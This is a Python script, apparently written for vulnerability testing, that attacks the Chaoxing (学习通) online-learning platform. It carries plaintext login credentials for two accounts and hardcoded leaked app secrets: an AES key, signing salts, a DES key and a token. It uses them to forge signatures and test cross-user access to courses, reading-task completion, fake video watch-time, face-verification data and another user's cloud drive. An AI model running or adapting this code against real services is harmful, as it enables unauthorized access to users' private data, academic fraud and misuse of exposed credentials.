import base64, hashlib, json, os, re, time, uuid, urllib.parse
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
VIDEO_SALT = "d_yHJ!$pdA~5"
FACE_SALT = "uWwjeEKsri"
READ_SALT = "NrRzLDpWB2JkeodIVAn4"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"

LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
results2 = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def login(phone, pwd):
    s = requests.Session(); s.verify = False
    s.headers.update({"User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*"})
    s.post(LOGIN_URL, data={"fid":"-1","uname":aes_enc(phone),"password":aes_enc(pwd),
        "refer":"http%3A%2F%2Fi.mooc.chaoxing.com","t":"true","forbidotherlogin":"0",
        "validate":"","doubleFactorLogin":"0","independentId":"0","independentNameId":"0"},
        allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID","_uid"): puid = c.value
    return s, puid

def video_enc(classid, userid, jobid, objectid, playing_time_ms, duration_ms, clip_time):
    s = f"[{classid}][{userid}][{jobid}][{objectid}][{playing_time_ms}][{VIDEO_SALT}][{duration_ms}][{clip_time}]"
    return hashlib.md5(s.encode()).hexdigest()

def face_enc(puid):
    return hashlib.md5((puid + FACE_SALT).encode()).hexdigest()

def inf_enc(params, order):
    parts = [f"{k}={urllib.parse.quote(params[k], safe='')}" for k in order]
    return hashlib.md5(("&".join(parts) + f"&DESKey={DES_KEY}").encode()).hexdigest()

def safe_json(r):
    try: return r.json()
    except: return {"raw_status": r.status_code, "raw_text": r.text[:300]}

def rec(tid, name, module, idor_type, vuln, sev, detail, evidence=""):
    results2.append({"id":tid,"name":name,"module":module,"idor_type":idor_type,
        "vuln":vuln,"sev":sev,"detail":detail,"evidence":evidence[:500]})
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid} [{module}]: {detail}")

def get_courses(session, puid):
    r = session.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    courses = []
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        course = c.get("course", {}).get("data", [{}])[0] if c.get("course", {}).get("data") else {}
        if course.get("id"):
            courses.append({
                "courseid": str(course.get("id", "")),
                "classid": str(c.get("id", "")),
                "cpi": str(c.get("cpi", "")),
                "name": c.get("name", "") or course.get("name", ""),
            })
    return courses

def run():
    print("="*70+f"\n学习通越权漏洞深入测试\n时间: {datetime.now():%Y-%m-%d %H:%M:%S}\n"+"="*70)

    s1, p1 = login("19312994130", "wtx3367653061")
    s2, p2 = login("15034188203", "lxy20030120")
    print(f"  puid1={p1}, puid2={p2}")

    courses1 = get_courses(s1, p1)
    courses2 = get_courses(s2, p2)
    c1 = courses1[0] if courses1 else {}
    c2 = courses2[0] if courses2 else {}

    # ================================================================
    # 1. 课程cpi越权深入测试
    # ================================================================
    print("\n[1] 课程cpi越权深入测试")

    # 1a: 遍历账号2的所有课程，用账号1的Cookie+账号2的cpi访问
    cross_access_count = 0
    cross_access_details = []
    for c in courses2[:5]:
        r = s1.get(f"https://mooc1.chaoxing.com/visit/stucoursemiddle?courseid={c['courseid']}&clazzid={c['classid']}&cpi={c['cpi']}", timeout=20)
        ok = r.status_code == 200 and len(r.text) > 500 and ("chapter" in r.text.lower() or "knowledge" in r.text.lower() or "point" in r.text.lower() or "card" in r.text.lower())
        if ok:
            cross_access_count += 1
            cross_access_details.append(c['name'])
        print(f"    课程'{c['name']}': {'可访问' if ok else '不可访问'} (HTTP {r.status_code}, len={len(r.text)})")

    rec("X1-01", "跨用户cpi批量访问课程", "课程信息", "水平越权",
        cross_access_count > 0, "HIGH",
        f"使用账号1的Cookie+账号2的cpi访问了{len(courses2[:5])}个课程，{cross_access_count}个可访问",
        f"可访问课程: {', '.join(cross_access_details)}")

    # 1b: 使用账号1的Cookie+账号2的cpi访问课程章节
    if c2.get("cpi"):
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stu-course-detail?courseid={c2.get('courseid','')}&clazzid={c2.get('classid','')}&cpi={c2['cpi']}", timeout=20)
        d = safe_json(r)
        chapter_ok = "data" in str(d) or "chapter" in str(d) or d.get("result") == 1
        rec("X1-02", "跨用户cpi访问课程章节详情", "课程信息", "水平越权",
            chapter_ok, "HIGH",
            f"使用账号1的Cookie+账号2的cpi访问课程章节: {'成功' if chapter_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前300字: {str(d)[:300]}")

    # 1c: 使用账号1的Cookie+账号2的cpi访问课程任务点
    if c2.get("cpi"):
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stu-job-info?courseid={c2.get('courseid','')}&clazzid={c2.get('classid','')}&cpi={c2['cpi']}", timeout=20)
        d = safe_json(r)
        job_ok = "data" in str(d) or "job" in str(d) or d.get("result") == 1
        rec("X1-03", "跨用户cpi访问课程任务点", "课程信息", "水平越权",
            job_ok, "HIGH",
            f"使用账号1的Cookie+账号2的cpi访问课程任务点: {'成功' if job_ok else '失败'}",
            f"HTTP {r.status_code}, 响应前300字: {str(d)[:300]}")

    # ================================================================
    # 2. 阅读任务越权深入测试
    # ================================================================
    print("\n[2] 阅读任务越权深入测试")

    # 2a: 获取课程的实际任务点数据
    if c1.get("courseid") and c1.get("classid") and c1.get("cpi"):
        r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stu-job-info?courseid={c1['courseid']}&clazzid={c1['classid']}&cpi={c1['cpi']}", timeout=20)
        d = safe_json(r)
        print(f"    任务点数据: {str(d)[:300]}")

        # 尝试获取具体的jobid和knowledgeid
        jobs = []
        if isinstance(d, dict):
            data = d.get("data", [])
            if isinstance(data, list):
                for item in data[:3]:
                    if isinstance(item, dict):
                        jobs.append({
                            "jobid": str(item.get("jobid", item.get("id", ""))),
                            "knowledgeid": str(item.get("knowledgeid", item.get("chapterId", ""))),
                            "name": item.get("name", item.get("property", {}).get("name", "")),
                            "type": item.get("type", item.get("property", {}).get("type", "")),
                        })
                        print(f"    任务点: {jobs[-1]}")

        if not jobs:
            # 尝试从章节列表获取
            r = s1.get(f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/stu-course-detail?courseid={c1['courseid']}&clazzid={c1['classid']}&cpi={c1['cpi']}", timeout=20)
            d = safe_json(r)
            print(f"    章节数据: {str(d)[:300]}")

    # 2b: 使用泄露的阅读盐值+自己的Cookie提交阅读任务（验证签名有效性）
    if c1.get("courseid") and c1.get("classid"):
        # 先获取真实任务点
        r = s1.get(f"https://mooc1.chaoxing.com/visit/stucoursemiddle?courseid={c1['courseid']}&clazzid={c1['classid']}&cpi={c1['cpi']}", timeout=20)
        # 尝试从HTML中提取知识卡片信息
        card_matches = re.findall(r'cardId["\s:=]+(\d+)', r.text)
        knowledge_matches = re.findall(r'knowledgeid["\s:=]+(\d+)', r.text)
        print(f"    从课程页面提取: cardId={card_matches[:3]}, knowledgeid={knowledge_matches[:3]}")

        # 使用实际参数测试阅读任务签名
        test_jobid = card_matches[0] if card_matches else "0"
        test_knowledgeid = knowledge_matches[0] if knowledge_matches else "0"
        read_params = {
            "jobid": test_jobid,
            "knowledgeid": test_knowledgeid,
            "courseid": c1["courseid"],
            "clazzid": c1["classid"],
            "jtoken": "0",
        }
        sorted_vals = "".join(read_params[k] for k in sorted(read_params.keys()))
        read_enc_val = hashlib.md5((sorted_vals + READ_SALT).encode()).hexdigest()

        r = s1.post("https://mooc1-api.chaoxing.com/ananas/job/readv2",
            data={
                "jobid": test_jobid,
                "knowledgeid": test_knowledgeid,
                "courseid": c1["courseid"],
                "clazzid": c1["classid"],
                "jtoken": "0",
                "enc": read_enc_val,
                "userid": p1,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        read_self_ok = d.get("result") is not False and d.get("result") != 0
        rec("X2-01", "使用泄露签名提交自己的阅读任务", "阅读任务", "签名绕过越权",
            read_self_ok, "HIGH",
            f"使用泄露K5盐值提交自己的阅读任务: {'成功' if read_self_ok else '失败'}",
            f"enc={read_enc_val}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

        # 2c: 使用泄露签名+目标用户userid提交阅读任务
        read_params2 = {
            "jobid": test_jobid,
            "knowledgeid": test_knowledgeid,
            "courseid": c1["courseid"],
            "clazzid": c1["classid"],
            "jtoken": "0",
        }
        sorted_vals2 = "".join(read_params2[k] for k in sorted(read_params2.keys()))
        read_enc_val2 = hashlib.md5((sorted_vals2 + READ_SALT).encode()).hexdigest()

        r = s1.post("https://mooc1-api.chaoxing.com/ananas/job/readv2",
            data={
                "jobid": test_jobid,
                "knowledgeid": test_knowledgeid,
                "courseid": c1["courseid"],
                "clazzid": c1["classid"],
                "jtoken": "0",
                "enc": read_enc_val2,
                "userid": p2,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        read_cross_ok = d.get("result") is not False and d.get("result") != 0
        rec("X2-02", "使用泄露签名+目标用户userid提交阅读任务", "阅读任务", "水平越权+签名绕过",
            read_cross_ok, "CRITICAL",
            f"使用账号1的Cookie+账号2的userid+泄露签名提交阅读: {'成功' if read_cross_ok else '被拒绝'}",
            f"enc={read_enc_val2}, userid={p2}, 响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # 3. 视频学时Cookie校验深入测试
    # ================================================================
    print("\n[3] 视频学时Cookie校验深入测试")

    if c1.get("classid") and c1.get("courseid"):
        # 3a: 使用自己的Cookie+自己的userid+enc提交（基线测试）
        fake_enc_self = video_enc(c1["classid"], p1, "9999999999", "fake_object_id", 1000, 60000, "0_60")
        r = s1.post("https://mooc1-api.chaoxing.com/multimedia/log/a/0/0",
            data={
                "clazzId": c1["classid"],
                "courseid": c1["courseid"],
                "userid": p1,
                "objectId": "fake_object_id",
                "playingTime": "60",
                "duration": "60",
                "enc": fake_enc_self,
                "clipTime": "0_60",
                "jobid": "9999999999",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        self_video_ok = d.get("result") is not False and d.get("result") != 0 and d.get("result") is not None
        rec("X3-01", "使用自己的Cookie+自己的userid提交学时", "视频学时", "基线",
            self_video_ok, "LOW",
            f"使用自己的Cookie+自己的userid+enc提交学时: {'成功' if self_video_ok else '失败'}",
            f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

        # 3b: 使用自己的Cookie+自己的userid+错误enc提交（验证enc校验）
        r = s1.post("https://mooc1-api.chaoxing.com/multimedia/log/a/0/0",
            data={
                "clazzId": c1["classid"],
                "courseid": c1["courseid"],
                "userid": p1,
                "objectId": "fake_object_id",
                "playingTime": "60",
                "duration": "60",
                "enc": "wrong_enc_value_123456",
                "clipTime": "0_60",
                "jobid": "9999999999",
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=20)
        d = safe_json(r)
        wrong_enc_ok = d.get("result") is not False and d.get("result") != 0 and d.get("result") is not None
        rec("X3-02", "使用错误enc提交学时", "视频学时", "签名校验",
            not wrong_enc_ok, "LOW",
            f"使用错误enc提交学时: {'被拒绝(签名校验有效)' if not wrong_enc_ok else '被接受(签名校验无效!)'}",
            f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # 4. 人脸验证enc签名与Cookie身份绑定测试
    # ================================================================
    print("\n[4] 人脸验证enc签名与Cookie身份绑定测试")

    # 4a: 使用自己的Cookie+自己的enc签名请求人脸验证
    face_enc_self = face_enc(p1)
    r = s1.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc_self}&token={HARDCODED_TOKEN}&_time={int(time.time())}", timeout=20)
    d = safe_json(r)
    self_face_ok = d.get("result") is not False and d.get("result") != 0
    rec("X4-01", "使用自己的Cookie+自己的enc请求人脸验证", "人脸验证", "基线",
        self_face_ok, "LOW",
        f"使用自己的Cookie+自己的enc请求人脸验证: {'成功' if self_face_ok else '失败'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # 4b: 使用自己的Cookie+目标用户的enc签名请求人脸验证
    face_enc_p2 = face_enc(p2)
    r = s1.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc_p2}&token={HARDCODED_TOKEN}&_time={int(time.time())}", timeout=20)
    d = safe_json(r)
    cross_face_ok = d.get("result") is not False and d.get("result") != 0
    rec("X4-02", "使用自己的Cookie+目标用户enc请求人脸验证", "人脸验证", "水平越权+签名绕过",
        cross_face_ok, "CRITICAL",
        f"使用账号1的Cookie+账号2的enc请求人脸验证: {'成功(严重!)' if cross_face_ok else '被拒绝(enc与Cookie身份绑定)'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # 4c: 不使用Cookie，仅使用enc签名请求人脸验证
    no_cookie_s = requests.Session(); no_cookie_s.verify = False
    no_cookie_s.headers.update({"User-Agent": MOBILE_UA, "Accept": "*/*"})
    r = no_cookie_s.get(f"https://passport2-api.chaoxing.com/api/getUserFaceid?enc={face_enc_self}&token={HARDCODED_TOKEN}&_time={int(time.time())}", timeout=20)
    d = safe_json(r)
    no_cookie_face_ok = d.get("result") is not False and d.get("result") != 0
    rec("X4-03", "无Cookie仅使用enc签名请求人脸验证", "人脸验证", "签名绕过越权",
        no_cookie_face_ok, "CRITICAL",
        f"无Cookie仅使用enc签名请求人脸验证: {'成功(严重!)' if no_cookie_face_ok else '被拒绝'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # 5. 个人云盘越权回顾测试（使用泄露密钥）
    # ================================================================
    print("\n[5] 个人云盘越权回顾测试")

    # 5a: 使用泄露Token+账号2的puid访问账号2的云盘
    r = s1.get(f"https://pan-yz.chaoxing.com/api/list?_token={HARDCODED_TOKEN}&puid={p2}&folderId=0", timeout=20)
    d = safe_json(r)
    pan_cross_ok = d.get("result") is not False and d.get("result") != 0 and d.get("result") is not None
    rec("X5-01", "使用泄露Token+目标用户puid访问云盘", "个人云盘", "水平越权+签名绕过",
        pan_cross_ok, "CRITICAL",
        f"使用泄露Token+账号2的puid访问账号2的云盘: {'成功(严重!)' if pan_cross_ok else '被拒绝'}",
        f"响应: {json.dumps(d, ensure_ascii=False)[:300]}")

    # ================================================================
    # Summary
    # ================================================================
    print("\n" + "="*70)
    print("深入测试结果汇总")
    print("="*70)
    vc = sum(1 for r in results2 if r["vuln"])
    tc = len(results2)
    print(f"  总测试数: {tc}, 存在隐患数: {vc}")
    for r in results2:
        tag = "[VULN]" if r["vuln"] else "[SAFE]"
        print(f"  {tag} {r['id']}: {r['detail'][:80]}")

    # Append to report
    with open("/workspace/idor_vuln_report.md", "a", encoding="utf-8") as f:
        f.write("\n---\n## 七、深入测试结果\n")
        f.write(f"**测试时间**: {datetime.now():%Y-%m-%d %H:%M:%S}\n\n")
        for r in results2:
            st = "存在风险" if r["vuln"] else "安全"
            f.write(f"\n### {r['id']}: {r['name']} [{st}]\n")
            f.write(f"- **越权类型**: {r['idor_type']}\n- **风险等级**: {r['sev']}\n- **结论**: {r['detail']}\n")
            if r["evidence"]:
                f.write(f"- **证据**: {r['evidence']}\n")

if __name__ == "__main__":
    import urllib3; urllib3.disable_warnings()
    run()
